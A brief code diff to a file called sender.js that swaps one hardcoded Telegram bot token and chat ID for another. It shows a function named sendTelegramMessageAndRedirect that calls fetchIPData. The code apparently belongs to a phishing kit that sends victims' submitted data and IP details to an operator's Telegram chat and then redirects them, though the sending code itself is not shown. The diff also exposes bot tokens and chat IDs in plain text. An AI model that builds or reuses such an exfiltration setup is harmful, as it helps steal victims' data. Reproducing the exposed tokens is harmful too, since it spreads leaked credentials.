@@ -1,7 +1,7 @@
 // console.log("sender.js connected");
 
-const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // Replace with your Telegram bot token
-const chatId = 5710607863;
+const telegramBotToken = "7129595481:AAFt5pg7TQkh3phlBZ4auN7f6K6qbJ0SXLc"; // Replace with your Telegram bot token
+const chatId = 5427845276;
 
 //////////////////////////////////////////
 //////////////////////////////////////////
@@ -94,3 +94,4 @@ function sendTelegramMessageAndRedirect(e) {
     fetchIPData(api, id);
   });
 }
+
